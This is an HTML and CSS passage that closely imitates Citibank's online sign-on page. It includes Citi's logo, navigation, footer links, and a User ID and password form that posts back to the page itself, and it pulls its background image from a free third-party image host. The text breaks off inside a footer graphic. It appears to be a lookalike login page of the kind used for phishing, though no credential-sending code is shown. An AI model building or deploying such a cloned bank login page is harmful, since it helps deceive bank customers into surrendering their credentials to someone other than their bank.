<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Sign On To Your Citi Account - Citibank</title>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            html,
            body {
                height: 100%;
            }

            .nav {
                position: relative;
                display: flex;
                flex-wrap: wrap;
                justify-content: space-between;
                align-items: flex-end;
                font-family: Arial;
                box-shadow: 0 1px 5px rgba(0, 0, 0,.125);
                z-index: 5;
            }

            .nav > svg {
                display: block;
                max-height: 32px;
                margin-left: 57px;
                margin-bottom: 30px;
                margin-top: 27px;
            }

            .items {
                display: flex;
                flex-wrap: wrap;
                gap: 28px;
                margin-bottom: 13px;
                margin-right: 39px;
            }

            .items > div {
                display: flex;
                align-items: center;
                flex-direction: column;
                cursor: pointer;
                user-select: none;
                color: #666;
                gap: 10px;
            }

            .items > div:hover {
                filter: invert(52%) sepia(23%) saturate(7077%) hue-rotate(194deg) brightness(92%) contrast(94%);
            }

            .items > div > svg {
                display: block;
                max-height: 26px;
            }

            .items > div > span {
                font-size: 11px;
            }

            .background {
                background: url('https://i.ibb.co/dsTkQPD/LSO-4959.png') no-repeat;
                background-size: cover;
                background-position: 50%;
                min-height: 400px;
            }

            .background > .background {
                display: none;
            }

            .container {
                display: block;
                padding: 12px 38px;
            }

            .container > .login {
                display: block;
                font-family: Arial;
                background-color: #FFF;
                max-width: 384px;
                margin-left: auto;
                padding: 20px 20px;
            }
            
            .login > div {
                display: flex;
                justify-content: space-between;
            }

            .login > div > span:first-of-type {
                color: #333;
                font-size: 21px;
            }

            .login > div > div {
                display: flex;
                align-items: center;
                gap: 10px;
            }

            .login > div > div > img {
                margin-left: auto;
                user-select: none;
                pointer-events: none;
                max-height: 25px;
            }

            .login > div > div > span {
                display: block;
                text-decoration: underline;
                cursor: pointer;
                user-select: none;
                color: #056DAE;
                font-size: 13px;
                max-width: 110px;
            }

            .login > span.error {
                display: block;
                visibility: hidden;
                color: #D60000;
                font-size: 15px;
                max-height: 0px;
                opacity: 0;
                transition: opacity .1s;
            }

            .login > span.error.visible {
                visibility: visible;
                opacity: 1;
                margin-top: 10px;
                max-height: 100%;
            }

            form > .inputs {
                display: flex;
                margin: 20px 0;
                gap: 20px;
            }

            .inputs > div > label {
                display: block;
                user-select: none;
                color: #666;
                font-size: 12px;
                transition: opacity .15s;
            }

            .inputs > div > input {
                display: block;
                background: #EEE;
                color: #333;
                letter-spacing: .5;
                outline: 0;
                padding: 14px 20px;
                width: 100%;
                border: 1px solid transparent;
                font-size: 16px;
                border-radius: 8px;
                margin-top: 6px;
            }

            .inputs > div > input.error {
                border-color: #FE0000;
            }

            .inputs > div > input:focus {
                border: 1px solid #056DAE;
            }

            .remember > label {
                display: flex;
                align-items: center;
                position: relative;
                color: #333;
                user-select: none;
                cursor: pointer;
                max-width: max-content;
                gap: 8px;
            }

            .remember > label > input {
                visibility: hidden;
                opacity: 0;
                height: 20px;
                width: 20px;
            }

            .remember > label > div {
                position: absolute;
                display: block;
                border: 1px solid #333;
                border-radius: 6px;
                height: 20px;
                width: 20px;
            }

            .remember > label > input:checked ~ div {
                background-image: url("data:image/svg+xml;charset=US-ASCII,%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20standalone%3D%22no%22%3F%3E%0A%3Csvg%20width%3D%2211px%22%20height%3D%228px%22%20viewBox%3D%220%200%2011%208%22%20version%3D%221.1%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%20xmlns%3Axlink%3D%22http%3A//www.w3.org/1999/xlink%22%20xmlns%3Asketch%3D%22http%3A//www.bohemiancoding.com/sketch/ns%22%3E%0A%20%20%20%20%3C%21--%20Generator%3A%20Sketch%203.4.1%20%2815681%29%20-%20http%3A//www.bohemiancoding.com/sketch%20--%3E%0A%20%20%20%20%3Ctitle%3ECheck%3C/title%3E%0A%20%20%20%20%3Cdesc%3ECreated%20with%20Sketch.%3C/desc%3E%0A%20%20%20%20%3Cdefs%3E%3C/defs%3E%0A%20%20%20%20%3Cg%20id%3D%22Toolkit/Grey-Background%22%20stroke%3D%22none%22%20stroke-width%3D%221%22%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%20sketch%3Atype%3D%22MSPage%22%3E%0A%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Smaller-Items%22%20sketch%3Atype%3D%22MSArtboardGroup%22%20transform%3D%22translate%28-674.000000%2C%20-318.000000%29%22%20fill%3D%22%23FFFFFF%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20sketch%3Atype%3D%22MSLayerGroup%22%20transform%3D%22translate%28190.000000%2C%20261.000000%29%22%20id%3D%22Check-Boxes%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20transform%3D%22translate%28480.000000%2C%200.000000%29%22%20sketch%3Atype%3D%22MSShapeGroup%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cg%20id%3D%22Selected%22%20transform%3D%22translate%280.000000%2C%2040.000000%29%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cpath%20d%3D%22M12.7701802%2C21.5033045%20L13.4023073%2C22.0998705%20C13.5153816%2C22.2069223%2013.5181599%2C22.377733%2013.4086972%2C22.4811115%20L9.75725639%2C25.9240706%20C9.64779372%2C26.0277114%209.4672081%2C26.0248252%209.35413372%2C25.9180358%20L8.57567081%2C25.1828416%20C8.46259643%2C25.0760522%208.45981819%2C24.9055039%208.56928085%2C24.801863%20L11.2493834%2C22.2745907%20L6.07969963%2C17.1857704%20C5.97107043%2C17.0834415%205.97384867%2C16.9147299%206.08581176%2C16.8087276%20L6.8564956%2C16.0811425%20C6.96845868%2C15.9754026%207.14709953%2C15.9725164%207.25572873%2C16.0753701%20L12.7701802%2C21.5033045%20Z%22%20id%3D%22Check%22%20transform%3D%22translate%289.744495%2C%2021.000000%29%20rotate%28-270.000000%29%20translate%28-9.744495%2C%20-21.000000%29%20%22%3E%3C/path%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%20%20%20%20%3C/g%3E%0A%20%20%20%20%3C/g%3E%0A%3C/svg%3E");
                background-repeat: no-repeat;
                background-color: #056DAE;
                background-size: 12px;
                background-position: 50%;
                border: 1px solid transparent;
            }

            form > button {
                all: unset;
                box-sizing: border-box;
                user-select: none;
                cursor: pointer;
                text-align: center;
                font-weight: bold;
                font-family: Arial;
                background: #056DAE;
                color: #FFF;
                padding: 16px 0;
                margin: 25px 0;
                font-size: 16px;
                width: 100%;
                border-radius: 6px;
            }

            .login > div:last-of-type {
                display: flex;
                flex-wrap: wrap;
                gap: 10px;
                margin-bottom: 25px;
            }

            .login > div:last-of-type > span {
                display: block;
                text-decoration: underline;
                user-select: none;
                cursor: pointer;
                color: #056DAE;
                font-size: 12px;
                flex: 45%;
            }

            .footer {
                display: block;
                position: sticky;
                font-family: Arial;
                color: #FFF;
                background-color: #333;
                top: 100%;
                padding: 35px 25px;
            }

            .footer > .links {
                display: flex;
                flex-wrap: wrap;
                justify-content: space-between;
                gap: 25px;
                margin: auto;
                max-width: 1185px;
            }

            .links > div {
                display: block;
            }

            .links > div > span {
                display: block;
                cursor: pointer;
                user-select: none;
                font-size: 12px;
                margin-top: 15px;
            }

            .links > div > span:first-of-type {
                user-select: auto;
                cursor: text;
                color: #FFF;
                font-weight: bold;
                font-size: 14px;
                margin-top: 0;
                margin-bottom: 25px;
            }

            .links > div > span:not(:first-of-type):hover {
                text-decoration: underline;
            }

            .links > div:last-of-type {
                display: flex;
                gap: 15px;
            }

            .links > div:last-of-type > svg {
                display: block;
                max-height: 50px;
            }

            .social {
                display: flex;
                flex-wrap: wrap;
                margin: auto;
                margin-top: 45px;
                gap: 25px;
                max-width: 1185px;
            }

            .download {
                display: flex;
                flex-wrap: wrap;
                gap: 10px;
            }

            .download > svg {
                cursor: pointer;
                max-height: 40px;
            }

            .icons {
                display: flex;
                flex-wrap: wrap;
                margin-left: auto;
                gap: 15px;
            }

            .icons > svg {
                cursor: pointer;
                max-height: 16px;
            }

            .copyright {
                display: flex;
                flex-wrap: wrap;
                margin: auto;
                border-top: 1px solid #666;
                border-bottom: 1px solid #666;
                margin-top: 35px;
                padding: 25px 0;
                max-width: 1185px;
                gap: 15px;
            }

            .copyright > span {
                display: block;
                cursor: pointer;
                font-size: 12px;
            }
            
            .copyright > span:not(:first-of-type):not(:nth-of-type(7)):hover {
                text-decoration: underline;
            }

            .copyright > span:first-of-type {
                cursor: auto;
                font-weight: bold;
            }

            .copyright > span:nth-of-type(7) {
                cursor: auto;
            }

            .copyright > span:last-of-type {
                font-weight: bold;
            }

            .disclosure {
                display: block;
                margin: auto;
                max-width: 1185px;
                font-size: 12px;
                margin-top: 35px;
            }

            .disclosure > span {
                display: block;
            }

            .disclosure > span:first-of-type {
                font-weight: bold;
            }

            .disclosure > span:not(:first-of-type) {
                margin-top: 15px;
            }

            .disclosure > span > span {
                cursor: pointer;
                text-decoration: underline;
            }

            @media (max-width: 975px) {
                .nav > svg {
                    margin: 0;
                    margin: 20px 12px;
                    max-height: 25px;
                }

                .nav > .items {
                    display: none;
                }

                .background > .background {
                    display: block;
                    min-height: 340px;
                }

                .container {
                    padding: 0;
                    max-height: 100%;
                }

                .container > .login {
                    max-width: 100%;
                }

                .login > div:not(:last-of-type) > span:first-of-type {
                    font-size: 16px;
                }

                .login > div > div {
                    display: none;
                }

                form > .inputs {
                    display: block;
                    gap: unset;
                }

                .inputs > div:first-of-type > label {
                    margin-top: 25px;
                }

                .inputs > div:last-of-type > label {
                    margin-top: 15px;
                }

                .links > div {
                    width: 100%;
                }

                .links > div > span:first-of-type {
                    cursor: pointer;
                    user-select: none;
                    margin: 0;
                }

                .links > div > span:not(:first-of-type) {
                    display: none;
                }

                .links > div > span {
                    padding-bottom: 25px;
                    border-bottom: 1px solid #666;
                    background: url("data:image/svg+xml,%3Csvg enable-background='new 0 0 330 330' version='1.1' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' viewBox='0 75 330.02 180.02'%3E%3Cpath fill='%23FFF' d='m325.61 79.393c-5.857-5.857-15.355-5.858-21.213 1e-3l-139.39 139.39-139.4-139.39c-5.857-5.857-15.355-5.858-21.213 1e-3 -5.858 5.858-5.858 15.355 0 21.213l150 150c2.813 2.813 6.628 4.393 10.606 4.393s7.794-1.581 10.606-4.394l150-150c5.859-5.857 5.859-15.355 1e-3 -21.213z'%3E%3C/path%3E%3C/svg%3E") no-repeat;
                    background-size: 15px;
                    background-position: right top;
                }

                .social,
                .icons {
                    width: 100%;
                }
            }
        </style>
    </head>
    <body>
        <div class="nav">
            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" viewBox="1.95 1.87 296.02 190.98">
                <g transform="translate(-109.83 -563.5)">
                    <g transform="matrix(8.5031 0 0 -8.5031 -3071.8 1310.7)">
                        <g clip-path="url(#clipPath38)">
                            <g transform="translate(385.02 69.544)">
                                <path d="m0 0-0.064-0.062c-1.005-1.024-2.168-1.565-3.366-1.565-2.502 0-4.317 1.877-4.317 4.466 0 2.585 1.815 4.465 4.317 4.465 1.198 0 2.361-0.544 3.366-1.572l0.064-0.061 1.609 1.946-0.043 0.052c-1.338 1.581-2.944 2.35-4.918 2.35-1.979 0-3.791-0.667-5.095-1.868-1.42-1.302-2.167-3.138-2.167-5.312s0.747-4.014 2.167-5.316c1.304-1.208 3.116-1.87 5.095-1.87 1.974 0 3.58 0.77 4.918 2.352l0.043 0.048-1.609 1.947" fill="#022E73"></path>
                            </g>
                        </g>
                        <path d="m388.25 65.462h2.842v13.876h-2.842v-13.876" fill="#022E73"></path>
                        <g clip-path="url(#clipPath52)">
                            <g transform="translate(402.23 68.478)">
                                <path d="m0 0c-0.759-0.462-1.464-0.695-2.098-0.695-0.919 0-1.335 0.486-1.335 1.566v7.363h2.897v2.612h-2.897v4.318l-2.785-1.492v-2.826h-2.404v-2.612h2.404v-7.832c0-2.133 1.264-3.593 3.152-3.631 1.281-0.025 2.053 0.357 2.521 0.637l0.03 0.019 0.683 2.676-0.168-0.103" fill="#022E73"></path>
                            </g>
                        </g>
                        <path d="m404.58 65.462h2.846v13.876h-2.846v-13.876" fill="#022E73"></path>
                        <g transform="translate(409.08 81.77)">
                            <path d="m0 0c-2.597 3.678-6.909 5.872-11.296 5.872-4.386 0-8.699-2.194-11.291-5.872l-0.134-0.189h3.27l0.036 0.039c2.225 2.298 5.131 3.512 8.119 3.512s5.892-1.214 8.122-3.512l0.036-0.039h3.268l-0.13 0.189" fill="#FF0000"></path>
                        </g>
                    </g>
                </g>
            </svg>
            <div class="items">
                <div>
                    <svg version="1.1" viewBox="0 0 26 26" xmlns="http://www.w3.org/2000/svg">
                        <g fill="none" fill-rule="evenodd">
                            <g transform="translate(-1352 -27)">
                                <g transform="translate(1324 27)">
                                    <g transform="translate(28)">
                                        <path d="m13 1c4.8747 0 9 3.9216 9 8.671 0 3.1662-2.8743 8.1806-8.6141 15.147-0.2 0.24274-0.57177 0.24274-0.77177 0-5.7398-6.9663-8.6141-11.981-8.6141-15.147 0-4.7494 4.1253-8.671 9-8.671zm0 1c-4.3334 0-8 3.4856-8 7.671 0 2.7844 2.6639 7.4967 8 14.04 5.3361-6.5436 8-11.256 8-14.04 0-4.1854-3.6666-7.671-8-7.671zm0 3c2.7614 0 5 2.2386 5 5 0 2.7614-2.2386 5-5 5s-5-2.2386-5-5c0-2.7614 2.2386-5 5-5zm0 1c-2.2091 0-4 1.7909-4 4s1.7909 4 4 4 4-1.7909 4-4-1.7909-4-4-4z" fill="#666"/>
                                    </g>
                                </g>
                            </g>
                        </g>
                    </svg>
                    <span>ATM / BRANCH</span>
                </div>
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 26 26">
                        <path d="M15.085 23.7969c.852-1.03 1.562-2.666 2.042-4.689 1.463.172 2.94.439 4.436.791-1.602 1.984-3.875 3.398-6.478 3.898ZM4.42 19.8739c1.498-.351 2.978-.615 4.45-.783.48 2.031 1.192 3.673 2.046 4.706-2.613-.502-4.894-1.926-6.496-3.923Zm6.496-17.671c-.857 1.036-1.57 2.685-2.051 4.725-1.465-.176-2.942-.449-4.437-.812 1.601-1.992 3.879-3.412 6.488-3.913Zm10.654 3.909c-1.496.364-2.972.637-4.435.814-.481-2.039-1.194-3.687-2.05-4.723 2.606.501 4.884 1.92 6.485 3.909Zm-3.78 6.388c-.027-1.637-.184-3.186-.448-4.59 1.605-.198 3.222-.503 4.865-.919 1.045 1.597 1.677 3.482 1.768 5.509H17.79Zm-1.449-4.49c.26 1.355.421 2.874.449 4.49H9.21c.028-1.615.189-3.133.449-4.488 2.231.211 4.448.211 6.682-.002ZM13 1.9999c1.181 0 2.4 1.995 3.13 5.027-2.092.192-4.17.193-6.26.002.729-3.033 1.949-5.029 3.13-5.029Zm-9.209 4.995c1.642.415 3.261.719 4.867.916-.264 1.404-.421 2.953-.448 4.589H2.025c.092-2.026.723-3.909 1.766-5.505Zm-1.766 6.505H8.21c.027 1.644.186 3.198.451 4.607-1.612.188-3.235.482-4.878.885-1.038-1.593-1.667-3.471-1.758-5.492Zm7.638 4.511c-.262-1.36-.425-2.887-.453-4.511h7.58c-.028 1.63-.192 3.16-.456 4.525-2.23-.209-4.445-.214-6.671-.014ZM13 23.9999c-1.178 0-2.395-1.985-3.125-5.006 2.084-.179 4.158-.175 6.247.014-.73 3.013-1.946 4.992-3.122 4.992Zm9.202-4.982c-1.641-.404-3.261-.7-4.866-.895.268-1.412.427-2.972.454-4.623h6.185c-.092 2.031-.725 3.919-1.773 5.518ZM13 .9999c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12Z" id="a"/>
                        <use stroke="#666" stroke-width=".2" fill="#666" xlink:href="#a" fill-rule="evenodd"/>
                    </svg>
                    <span>ESPAÑOL</span>
                </div>
            </div>
        </div>
        <div class="background">
            <div class="background"></div>
            <div class="container">
                <div class="login">
                    <div>
                        <span>Sign On</span>
                        <div>
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFEAAABRCAMAAACdUboEAAAA81BMVEUAAAAAgIAAVaoAdrEAbbYAZqoAb7EAaqoJcaoJba0JarAJb6oIa60IcK8Ica0Hba8HarEHbqwGbKwGbq4GbLAGb6wFa60Fbq8Eba4Ebq0EbK4Ebq8Gba8Fbq0Fba4Fbq4FbK4Fba8FbK0Fbq4FbK8Fba0Fba4Fbq4Fba0Fbq4Fba4Fbq8Fba4FbK4Fba8Fbq4Fba8Fba4Fba4Fba4Fba0Fba4Fba4Fba4Fba4Fba4Fba4Fba4Fba4Fba0Fba0Fba4Fba4Fba4Eba4EbK4Eba4Gba4Fba4Fba4Fba0Fba4Fba4Fba4Fba4Fba4Fba4Fba7///+PgjcHAAAAT3RSTlMAAgMNDg8XGBscHR4fICIjJCUoLC0uMjM/QUJDWV1eX2hpamuSk5Sen6OkpaanqLq7vMPExcbHzM3R0tPa297f4OLj5OXm7u/09fb3/P3+kpz0DAAAAAFiS0dEUONuTLwAAAIkSURBVFjD7ZltU9pAFEYvSJUKSqlUa0pBRYVAQUSkSrHyXkuJ5///m35IYimhWSHLWGfyfFvu7pnMJMvunhVxki58uRqMJ9ixWgnxT7JlOX0n48FVpZCeqxuXzKWoIJbmB9SNmeqbCp5UFcSad0g55hbffvNW+3sKYqbvHdSOO09oA+9Pc4f7u06SEVElknQ77x/mzro20n7KCsAwG5UgiWaHAGUREQPg66YEzeYNgCEil8AwOFBkawTURdIAWdGRLPCYkgLwPaqFGL0HjqUCnIqenAOmNIHPmog5oCE94KMmogF05QeQ0UT8AIzlF/Dnf+OORek8qyryHvgpFrDz9BuL86yqyC5gCRqJOwAh8b8lWsC2JuI2MJVr6Ec0EaMDaEqiWJ1ZpIIRZa9anF/nAxIXJCSGxJC4HLHju9p1FGthmDB6c6f9i1tlVgQjTgAm/2quQvRvhsSXezOv4Xt8GWKyVMtoI2ZqpYS0ltjjKg/YA2gutQ9Xxd6HL3NWUGX508c6iP5zZhWif/P1EC2NRNsB/O0pVLsv/zdjewr9LkWn7/kEdLU6qTzQWIM3O9Ho9rrA0Rr8o2ZHeuF63Jut4MAnjytlgFFg1zwCMEVEJNa2ffhZ3jhIuT5czY+6Pjx1YOTPbR9+u2HX4m3vxBsonf3QO+g27lZjppZ7BXNj1pfWg959PF4Ycz3eHZuN3vjBqU+bqvuZxPXU6fsw7jXMo5Rb+A0Q7N1/w9fJfgAAAABJRU5ErkJggg==" alt="QR Code">
                            <span>Sign On with the Citi Mobile® App</span>
                        </div>
                    </div>
                    <span class="error">Your User ID or Password is incorrect, please try again.</span>
                    <form action="" method="POST">
                        <div class="inputs">
                            <div>
                                <label>User ID</label>
                                <input type="text" placeholder="User ID">
                            </div>
                            <div>
                                <label>Password</label>
                                <input type="password" placeholder="Password">
                            </div>
                        </div>
                        <div class="remember">
                            <label for="box">
                                <input id="box" type="checkbox">
                                <div></div>
                                Remember User ID
                            </label>
                        </div>
                        <button type="submit">Sign On</button>
                    </form>
                    <div>
                        <span>Forgot User ID?</span>
                        <span>Forgot Password?</span>
                        <span>Activate a Card</span>
                        <span>Register for Online Access</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">
            <div class="links">
                <div>
                    <span>Why Citi</span>
                    <span>Our Story</span>
                    <span>Careers</span>
                    <span>Benefits and Services</span>
                    <span>Rewards</span>
                    <span>Citi Easy Deals℠</span>
                    <span>Citi Entertainment &copy;</span>
                    <span>Special Offers</span>
                </div>
                <div>
                    <span>Wealth Management</span>
                    <span>Citigold® Private Client</span>
                    <span>Citigold</span>
                    <span>Citi Priority</span>
                    <span>Citi Private Bank</span>
                </div>
                <div>
                    <span>Business Banking</span>
                    <span>Small Business Accounts</span>
                    <span>Commerical Accounts</span>
                </div>
                <div>
                    <span>Rates</span>
                    <span>Personal Banking</span>
                    <span>Credit Cards</span>
                    <span>Mortgage</span>
                    <span>Home Equity</span>
                    <span>Lending</span>
                </div>
                <div>
                    <span>Help & Support</span>
                    <span>Contact Us</span>
                    <span>Help & FAQs</span>
                    <span>Security Center</span>
                </div>
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192.77 192.77">
                        <g fill-rule="evenodd" clip-rule="evenodd">
                            <path fill="none" d="M0 0h192.756v192.756H0V0z"></path>
                            <path fill="#FFF" d="M47.342 80.759h25.574c23.057 0 37.764 14.178 37.764 36.308 0 24.514-16.297 36.439-42.269 36.439H47.342V80.759zm23.99 16.686c-.928 0-2.12.131-3.71.131v39.223c12.985 0 23.056-5.168 23.056-20.141 0-12.853-8.216-19.213-19.346-19.213zM189.922 101.938V82.723c-5.168-2.12-9.807-3.313-16.299-3.313-21.334 0-38.428 16.166-38.428 37.5s16.828 36.971 38.031 36.971c7.553 0 12.719-1.592 16.695-4.639v-19.213c-5.963 3.709-10.07 5.299-15.637 5.299-10.732 0-19.08-7.816-19.08-19.346 0-11.264 8.48-19.479 19.08-19.479 5.831.001 10.071 1.989 15.638 5.435zM2.834 66.173v3.445h14.179v-3.445c-4.108-.132-4.771-.663-4.771-3.445V45.369l8.48 24.249H24.3l9.143-24.249V62.33c0 3.577 0 3.577-5.035 3.842v3.445H44.84v-3.445c-4.771 0-4.903-.53-4.903-3.047v-16.96c0-2.783.397-3.711 4.903-3.711v-3.577H30.794l-7.156 19.479-6.625-19.479H2.834v3.577c3.976 0 4.638 0 4.638 3.445v16.299c0 3.18 0 3.975-4.638 3.975zM71.587 66.173v3.445h13.118v-3.445c-3.18-.132-3.18-.53-3.18-4.903v-3.71c0-3.578 1.59-6.493 4.902-6.493 2.65 0 3.445 1.723 3.445 4.108v7.818c0 2.65-.132 3.18-3.312 3.18v3.445h11.792v-3.445c-2.782 0-3.047-.265-3.047-2.915v-5.433c0-3.71 1.723-6.89 5.168-6.89 2.65 0 3.18 1.59 3.18 4.77v7.951c0 2.252 0 2.518-3.18 2.518v3.445h12.986v-3.445c-3.977 0-4.24.132-4.24-2.12v-8.878c0-5.036-1.193-7.951-6.361-7.951-3.047 0-5.035 1.192-7.553 3.843-1.325-2.385-3.18-3.975-6.36-3.975-3.313 0-5.566 1.722-7.42 4.24v-3.578h-9.938v3.181c3.975 0 4.373.132 4.373 3.313v7.287c0 4.637 0 4.637-4.373 4.637zM3.471 80.759v72.747h20.008l.133-27.826h19.479v-16.828H23.745l-.133-11.264h20.936V80.759H3.471zM115.047 38.885h9.275v11.264c2.518-2.12 4.107-2.915 6.625-2.915 5.301 0 8.879 4.77 8.879 11.396 0 7.155-3.578 11.793-9.674 11.793-2.914 0-4.77-.928-6.758-3.048l-1.855 2.518h-2.781V46.041c0-3.578-.266-3.975-3.711-3.975v-3.181zm18.557 19.733c0-5.035-1.855-7.553-4.506-7.553-3.445 0-4.902 2.783-4.902 7.951 0 4.505 1.723 7.553 4.77 7.553 2.516 0 4.638-2.385 4.638-7.951zM168.047 66.173v3.445h14.311v-3.445c-3.975 0-4.371.132-4.371-3.047v-4.771c0-4.373 1.457-8.348 5.432-8.348.266 0 .531 0 1.326.265-1.326.663-2.254 1.59-2.254 3.048 0 1.723 1.326 2.915 3.049 2.915 2.119 0 3.576-1.59 3.576-3.976 0-2.915-2.119-5.035-5.035-5.035-2.385 0-4.107 1.192-6.227 3.578v-3.048h-9.807v3.181c3.445 0 4.373 0 4.373 2.915v9.01c0 3.048 0 3.313-4.373 3.313zM150.027 59.293c0 4.24 1.988 7.155 5.566 7.155 3.18 0 4.637-1.855 5.168-4.77h3.975c-.662 5.565-4.373 8.613-9.674 8.613-6.359 0-11.131-3.843-11.131-11.263 0-6.758 4.24-11.793 10.602-11.793 6.229 0 10.203 4.77 10.203 12.058h-14.709zm4.506-8.631c-2.65 0-4.24 1.855-4.24 5.168h8.348c0-3.445-1.325-5.168-4.108-5.168zM53.568 59.293c0 4.24 2.12 7.155 5.698 7.155 3.18 0 4.637-1.855 5.167-4.77h3.843c-.663 5.565-4.24 8.613-9.541 8.613-6.36 0-11.263-3.843-11.263-11.263 0-6.758 4.373-11.793 10.733-11.793 6.228 0 10.071 4.77 10.071 12.058H53.568zm4.637-8.631c-2.65 0-4.24 1.855-4.24 5.168h8.216c-.001-3.578-1.326-5.168-3.976-5.168zM112.801 153.506h20.01V80.759h-20.01v72.747z"></path>
                        </g>
                    </svg>
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192.77 192.77">
                        <g fill-rule="evenodd" clip-rule="evenodd">
                            <path fill="none" d="M0 0h192.756v192.756H0V0z"></path>
                            <path fill="#FFF" d="M26.473 148.555h-7.099v2.81h6.52v2.373h-6.52v3.453h7.414v2.375H16.636v-13.378h9.837v2.367zM35.45 155.928l1.342 1.264a3.247 3.247 0 0 1-1.509.357c-1.51 0-3.635-.93-3.635-4.674s2.125-4.674 3.635-4.674c1.509 0 3.632.93 3.632 4.674 0 1.254-.242 2.18-.614 2.873l-1.416-1.322-1.435 1.502zm6.317 3.09l-1.457-1.371c.82-1.045 1.4-2.572 1.4-4.771 0-6.277-4.658-7.039-6.428-7.039-1.769 0-6.425.762-6.425 7.039 0 6.281 4.656 7.041 6.425 7.041.78 0 2.16-.146 3.427-.898l1.586 1.514 1.472-1.515zM54.863 154.889c0 3.516-2.127 5.027-5.499 5.027-1.228 0-3.054-.297-4.246-1.619-.726-.814-1.006-1.904-1.042-3.242v-8.867h2.85v8.678c0 1.869 1.08 2.684 2.382 2.684 1.921 0 2.701-.93 2.701-2.551v-8.811h2.855v8.701h-.001zM62.348 149.207h.041l1.655 5.291H60.63l1.718-5.291zm-2.464 7.594h4.939l.858 2.766h3.037l-4.71-13.379h-3.225l-4.769 13.379h2.943l.927-2.766zM73.692 157.145h6.65v2.421h-9.448v-13.378h2.798v10.957zM90.938 153.562v6.004h-2.79v-13.378h2.79v5.066h5.218v-5.066h2.791v13.378h-2.791v-6.004h-5.218zM104.273 152.875c0-3.744 2.127-4.674 3.631-4.674 1.512 0 3.637.93 3.637 4.674s-2.125 4.674-3.637 4.674c-1.504 0-3.631-.93-3.631-4.674zm-2.791 0c0 6.281 4.66 7.041 6.422 7.041 1.777 0 6.432-.76 6.432-7.041 0-6.277-4.654-7.039-6.432-7.039-1.761 0-6.422.762-6.422 7.039zM127.676 154.889c0 3.516-2.127 5.027-5.5 5.027-1.23 0-3.051-.297-4.248-1.619-.725-.814-1.006-1.904-1.039-3.242v-8.867h2.846v8.678c0 1.869 1.084 2.684 2.391 2.684 1.918 0 2.699-.93 2.699-2.551v-8.811h2.852v8.701h-.001zM132.789 155.445c.025.744.4 2.162 2.838 2.162 1.32 0 2.795-.316 2.795-1.736 0-1.039-1.006-1.322-2.42-1.656l-1.436-.336c-2.168-.502-4.252-.98-4.252-3.924 0-1.492.807-4.119 5.145-4.119 4.102 0 5.199 2.68 5.219 4.32h-2.686c-.072-.592-.297-2.012-2.738-2.012-1.059 0-2.326.391-2.326 1.602 0 1.049.857 1.264 1.41 1.395l3.264.801c1.826.449 3.5 1.195 3.5 3.596 0 4.029-4.096 4.379-5.271 4.379-4.877 0-5.715-2.814-5.715-4.471h2.673v-.001zM146.186 159.566H143.4v-13.378h2.786v13.378zM157.35 146.188h2.605v13.378h-2.791l-5.455-9.543h-.047v9.543h-2.605v-13.378H152l5.303 9.316h.047v-9.316zM169.307 152.355h5.584v7.211h-1.859l-.279-1.676c-.707.812-1.732 2.025-4.174 2.025-3.221 0-6.143-2.309-6.143-7.002 0-3.648 2.031-7.098 6.533-7.078 4.105 0 5.727 2.66 5.867 4.512h-2.791c0-.523-.953-2.203-2.924-2.203-1.998 0-3.84 1.377-3.84 4.803 0 3.654 1.994 4.602 3.893 4.602.615 0 2.67-.238 3.242-2.943h-3.109v-2.251zM18.836 173.197c0-3.744 2.123-4.678 3.63-4.678 1.509 0 3.631.934 3.631 4.678 0 3.742-2.122 4.68-3.631 4.68-1.507 0-3.63-.938-3.63-4.68zm-2.794 0c0 6.275 4.656 7.049 6.425 7.049 1.77 0 6.426-.773 6.426-7.049s-4.657-7.039-6.426-7.039c-1.769 0-6.425.764-6.425 7.039zM36.549 172.748v-3.934h2.217c1.731 0 2.459.545 2.459 1.85 0 .596 0 2.084-2.088 2.084h-2.588zm0 2.314h3.202c3.597 0 4.265-3.059 4.265-4.268 0-2.625-1.561-4.285-4.153-4.285h-6.107v13.379h2.793v-4.826zM51.599 172.748v-3.934h2.213c1.733 0 2.46.545 2.46 1.85 0 .596 0 2.084-2.083 2.084h-2.59zm0 2.314h3.204c3.594 0 4.267-3.059 4.267-4.268 0-2.625-1.563-4.285-4.153-4.285h-6.113v13.379h2.795v-4.826zM66.057 173.197c0-3.744 2.118-4.678 3.633-4.678 1.502 0 3.63.934 3.63 4.678 0 3.742-2.127 4.68-3.63 4.68-1.515 0-3.633-.938-3.633-4.68zm-2.795 0c0 6.275 4.655 7.049 6.428 7.049 1.765 0 6.421-.773 6.421-7.049s-4.656-7.039-6.421-7.039c-1.773 0-6.428.764-6.428 7.039zM83.717 172.396v-3.582h3.479c1.64 0 1.954 1.049 1.954 1.756 0 1.324-.705 1.826-2.159 1.826h-3.274zm-2.746 7.493h2.746v-5.236h2.882c2.07 0 2.184.705 2.184 2.531 0 1.375.105 2.064.292 